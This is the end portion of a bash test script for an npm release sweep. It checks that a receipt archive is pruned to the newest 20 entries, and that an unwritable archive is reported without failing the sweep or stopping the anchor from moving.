if [ "$SW_RC" -eq 0 ] && [ "$(archived)" = 20 ] && [ "$pruned_right" = 1 ] \
   && [ -f "$ARCH/$HEAD4.json" ] && [ -f "$ARCH/$HEAD2.json" ] && [ -f "$ARCH/$HEAD1.json" ]; then
  ok "the archive keeps the newest 20: of 28 receipts the 8 oldest are gone, the sweep's own and the two earlier real ones stayed"
else
  bad "the archive was not pruned to the newest 20 (rc=$SW_RC, holds $(archived), oldest-8-gone=$pruned_right)"; printf '%s\n' "$SW_OUT" | tail -n 12 | sed 's/^/      | /' >&2
fi

# The archive is a record, not a verdict: where it cannot be written (a file stands where the directory should be) the sweep says so, stays green and still moves the anchor.
rm -rf "$ARCH" && : > "$ARCH"
next_commit "$SW"; sweep "$SW"; HEAD5="$(git -C "$SW" rev-parse HEAD)"
if [ "$SW_RC" -eq 0 ] && [ "$(jq -r .head_sha "$ANCHOR")" = "$HEAD5" ] && printf '%s' "$SW_OUT" | grep -Fq 'could not archive'; then
  ok "an archive that cannot be written is said so and never fails the sweep: the anchor still moves on"
else
  bad "an unwritable archive was silent, failed the sweep, or stopped the anchor (rc=$SW_RC)"; printf '%s\n' "$SW_OUT" | tail -n 12 | sed 's/^/      | /' >&2
fi

echo ""
echo "ship-npm-only-after-bump.test.sh: $PASS passed, $FAIL failed."
[ "$FAIL" -eq 0 ] || exit 1
exit 0
